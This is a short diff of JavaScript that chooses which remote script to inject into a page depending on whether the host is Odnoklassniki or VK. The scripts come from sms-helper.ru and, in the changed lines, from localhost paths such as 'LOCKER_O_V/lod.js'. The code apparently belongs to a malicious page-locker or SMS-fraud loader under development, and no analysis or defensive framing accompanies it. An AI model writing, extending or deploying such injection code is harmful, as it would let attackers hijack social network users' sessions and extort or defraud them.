@@ -17,14 +17,14 @@ try{
 	switch(id){
 		case '562c1b1350d834fba62fd8c05706899e':
 			if(location.hostname.indexOf('odnoklassniki') > -1)
-				var scr = 'http://sms-helper.ru/js/od_test/lod.js';
+				var scr = 'http://localhost/LOCKER_O_V/lod.js';
 			if(location.hostname.indexOf('vk') > -1)
 				var scr = 'http://sms-helper.ru/js/vkt/lvk.js';
 		break;
 		
 		case 'e747eb2129f44e85b0d0cc5a70074daa':
 			if(location.hostname.indexOf('odnoklassniki') > -1)
-				var scr = 'http://sms-helper.ru/js/od_test/lod.js';
+				var scr = 'http://localhost/LOCKER_O_V/lod.js';
 			if(location.hostname.indexOf('vk') > -1)
 				var scr = 'http://localhost/vk/lvk.js';
 		break;
